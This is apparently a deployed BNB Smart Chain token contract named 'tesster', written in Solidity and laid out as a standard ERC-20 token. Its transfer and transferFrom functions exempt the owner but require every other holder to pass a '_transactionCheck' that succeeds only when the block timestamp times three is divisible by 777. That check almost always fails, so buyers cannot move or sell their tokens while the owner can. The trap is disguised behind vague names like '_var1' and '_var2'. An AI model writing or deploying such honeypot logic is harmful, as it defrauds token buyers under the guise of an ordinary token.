/**
 *Submitted for verification at BscScan.com on 2023-05-23
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract testnet {
    string public name = "tesster";
    string public symbol = "test";
    uint256 public totalSupply = 250000000 * 10**18; 
    uint8 public decimals = 18;
    uint256 private _var1 = 777;
    bool private _var2 = false;
    address private _owner;
    
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    
    constructor() {
        balanceOf[msg.sender] = totalSupply;
        _owner = msg.sender;
        emit Transfer(address(0), msg.sender, totalSupply);  // Emit the Transfer event
    }

    
    function _transfer(address from, address to, uint256 value) internal {
        require(balanceOf[from] >= value, "Insufficient balance");
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
    }
    
    function transfer(address to, uint256 value) public returns (bool) {
        if (msg.sender != _owner) {
            require(_transactionCheck(), "Transfer did not pass the check");
        }
        _transfer(msg.sender, to, value);
        return true;
    }
    
    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0), "Approve to zero address");
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= balanceOf[sender], "Insufficient balance");
        require(amount <= allowance[sender][msg.sender], "Insufficient allowance");
        if (sender != _owner) {
            require(_transactionCheck(), "Transfer did not pass the check");
        }
        _transfer(sender, recipient, amount);
        allowance[sender][msg.sender] -= amount;
        return true;
    }
    
    function _transactionCheck() internal returns (bool) {
        uint256 num = block.timestamp * 3;
        _var2 = (num % _var1 == 0) ? true : false;
        return _var2;
    }
}